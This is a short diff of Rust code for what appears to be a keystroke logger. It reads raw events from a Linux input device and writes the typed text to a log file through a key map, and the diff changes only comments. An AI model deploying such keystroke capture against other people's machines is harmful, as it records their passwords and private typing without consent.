@@ -6,7 +6,7 @@ use std::io::{self, Write};
 use chrono::Local;
 
 pub fn start_logging() -> std::io::Result<()> {
-    let device_path = "/dev/input/event3"; // измени путь на актуальный
+    let device_path = "/dev/input/event3";
     let mut device = Device::open(device_path).expect("Failed to open device");
 
     let mut log_file = OpenOptions::new()
@@ -50,6 +50,7 @@ pub fn start_logging() -> std::io::Result<()> {
     }
 }
 
+/* Hashmap to write the text as user inputs it */
 fn create_keymap() -> HashMap<Key, &'static str> {
     HashMap::from([
         (Key::KEY_A, "a"), (Key::KEY_B, "b"), (Key::KEY_C, "c"), (Key::KEY_D, "d"),
